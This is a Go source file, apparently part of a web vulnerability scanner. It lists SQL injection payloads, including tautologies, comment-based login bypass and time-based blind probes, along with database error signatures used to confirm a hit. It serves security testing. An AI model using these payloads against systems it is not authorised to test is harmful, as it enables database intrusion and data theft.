package techniques

// SQLiPayloads for SQL injection testing.
var SQLiPayloads = []string{
	"' OR '1'='1",
	"' OR '1'='1' --",
	"' OR '1'='1' /*",
	"1' ORDER BY 1--",
	"' AND 1=1--",
	"' AND 1=2--",
	"1 OR 1=1",
	"' OR 'x'='x",
	"admin' --",
	"' OR 1=1 LIMIT 1--",
	"1' ORDER BY 10--",
	`" OR "1"="1`,
	"') OR ('1'='1",
	"1) OR (1=1",
}

// SQLiTimePayloads for time-based blind SQLi.
var SQLiTimePayloads = []string{
	"' AND SLEEP(5)--",
	"1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
	"'; WAITFOR DELAY '0:0:5'--",
	"' OR SLEEP(5)--",
	"1; SELECT pg_sleep(5)--",
}

// SQLiErrorSignatures are database error strings that confirm SQLi.
var SQLiErrorSignatures = []string{
	"sql syntax",
	"mysql_fetch",
	"sqlite3.operationalerror",
	"unclosed quotation mark",
	"quoted string not properly terminated",
	"you have an error in your sql syntax",
	"warning: mysql",
	"pg_query",
	"unterminated string",
	"syntax error at or near",
	"sqlstate",
	"microsoft ole db provider for sql server",
	"microsoft sql native client error",
	"invalid query",
	"ora-01756",
	"ora-00933",
	"error in your sql",
	"sqlite_error",
	"sequelizedatabaseerror",
	"unrecognized token",
}

// SQLiDescription describes the SQL injection technique.
const SQLiDescription = "SQL Injection - Tests for SQL injection vulnerabilities by injecting SQL syntax into parameters"
